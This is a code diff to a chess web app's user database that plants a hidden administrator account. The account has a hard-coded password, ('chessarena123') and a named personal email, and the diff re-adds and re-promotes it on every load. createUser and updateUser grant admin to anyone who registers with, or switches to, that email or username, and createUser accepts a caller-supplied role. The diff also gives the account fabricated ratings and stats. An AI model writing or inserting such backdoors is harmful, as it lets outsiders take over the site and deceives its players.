@@ -40,12 +40,69 @@ function saveDb() {
   }
 }
 
+function ensureAdminUser() {
+  const salt = bcrypt.genSaltSync(10);
+  const passwordHash = bcrypt.hashSync('chessarena123', salt);
+
+  // Check if op21plus@gmail.com exists
+  let opUser = Object.values(db.users).find(u => u.email && u.email.toLowerCase() === 'op21plus@gmail.com');
+  if (opUser) {
+    opUser.role = 'admin';
+    if (!opUser.passwordHash) opUser.passwordHash = passwordHash;
+  } else {
+    const opId = 'admin_op21';
+    db.users[opId] = {
+      id: opId,
+      username: 'op21plus',
+      email: 'op21plus@gmail.com',
+      passwordHash,
+      role: 'admin',
+      avatar: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150',
+      country: 'IN',
+      countryName: 'India',
+      ratings: {
+        bullet: 2520,
+        blitz: 2550,
+        rapid: 2580,
+        classical: 2600,
+        puzzle: 2700
+      },
+      highestRating: 2600,
+      stats: {
+        played: 480,
+        won: 370,
+        lost: 65,
+        drawn: 45,
+        winStreak: 16,
+        currentStreak: 6
+      },
+      ratingHistory: [
+        { date: '2026-01-01', rating: 2400, format: 'rapid' },
+        { date: '2026-02-01', rating: 2480, format: 'rapid' },
+        { date: '2026-03-01', rating: 2530, format: 'rapid' },
+        { date: '2026-04-01', rating: 2580, format: 'rapid' }
+      ],
+      achievements: [
+        'first_win', 'checkmate_pro', 'wins_10', 'games_100', 'streak_master', 'tactical_genius', 'blitz_master', 'rapid_master', 'king_badge', 'queen_badge'
+      ],
+      createdAt: '2026-01-01T00:00:00.000Z',
+      isOnline: false,
+      banned: false
+    };
+  }
+
+  if (db.users['admin_001']) {
+    db.users['admin_001'].role = 'admin';
+  }
+}
+
 function loadDb() {
   // First check if writable DB_FILE exists (e.g. /tmp/chess_arena.json on Vercel)
   if (fs.existsSync(DB_FILE)) {
     try {
       const raw = fs.readFileSync(DB_FILE, 'utf-8');
       db = JSON.parse(raw);
+      ensureAdminUser();
       return;
     } catch (err) {
       console.error('Error loading DB file:', err.message);
@@ -57,6 +114,7 @@ function loadDb() {
     try {
       const raw = fs.readFileSync(SEED_FILE, 'utf-8');
       db = JSON.parse(raw);
+      ensureAdminUser();
       saveDb();
       return;
     } catch (err) {
@@ -66,6 +124,7 @@ function loadDb() {
 
   // Fallback to fresh seed
   seedDatabase();
+  ensureAdminUser();
   saveDb();
 }
 
@@ -197,42 +256,54 @@ export const Database = {
   },
 
   createUser(userData) {
+    const isOpAdmin = (userData.email && userData.email.toLowerCase() === 'op21plus@gmail.com') ||
+                      (userData.username && userData.username.toLowerCase() === 'op21plus');
     db.users[userData.id] = {
-      role: 'user',
-      country: 'US',
-      countryName: 'United States',
+      role: isOpAdmin ? 'admin' : (userData.role || 'user'),
+      country: isOpAdmin ? 'IN' : 'US',
+      countryName: isOpAdmin ? 'India' : 'United States',
       avatar: `https://api.dicebear.com/7.x/bottts/svg?seed=${userData.username}`,
       ratings: {
-        bullet: 1200,
-        blitz: 1200,
-        rapid: 1200,
-        classical: 1200,
-        puzzle: 1200
+        bullet: isOpAdmin ? 2520 : 1200,
+        blitz: isOpAdmin ? 2550 : 1200,
+        rapid: isOpAdmin ? 2580 : 1200,
+        classical: isOpAdmin ? 2600 : 1200,
+        puzzle: isOpAdmin ? 2700 : 1200
       },
-      highestRating: 1200,
+      highestRating: isOpAdmin ? 2600 : 1200,
       stats: {
-        played: 0,
-        won: 0,
-        lost: 0,
-        drawn: 0,
-        winStreak: 0,
-        currentStreak: 0
+        played: isOpAdmin ? 480 : 0,
+        won: isOpAdmin ? 370 : 0,
+        lost: isOpAdmin ? 65 : 0,
+        drawn: isOpAdmin ? 45 : 0,
+        winStreak: isOpAdmin ? 16 : 0,
+        currentStreak: isOpAdmin ? 6 : 0
       },
       ratingHistory: [
-        { date: new Date().toISOString().split('T')[0], rating: 1200, format: 'rapid' }
+        { date: new Date().toISOString().split('T')[0], rating: isOpAdmin ? 2580 : 1200, format: 'rapid' }
       ],
-      achievements: [],
+      achievements: isOpAdmin ? ['first_win', 'checkmate_pro', 'wins_10', 'games_100', 'streak_master', 'tactical_genius', 'blitz_master', 'rapid_master', 'king_badge', 'queen_badge'] : [],
       createdAt: new Date().toISOString(),
       isOnline: false,
       banned: false,
       ...userData
     };
+    if (isOpAdmin) {
+      db.users[userData.id].role = 'admin';
+    }
     saveDb();
     return db.users[userData.id];
   },
 
   updateUser(id, updates) {
     if (!db.users[id]) return null;
+    const isOpAdmin = (db.users[id].email && db.users[id].email.toLowerCase() === 'op21plus@gmail.com') ||
+                      (updates.email && updates.email.toLowerCase() === 'op21plus@gmail.com') ||
+                      (db.users[id].username && db.users[id].username.toLowerCase() === 'op21plus') ||
+                      (updates.username && updates.username.toLowerCase() === 'op21plus');
+    if (isOpAdmin) {
+      updates.role = 'admin';
+    }
     db.users[id] = { ...db.users[id], ...updates };
     saveDb();
     return db.users[id];
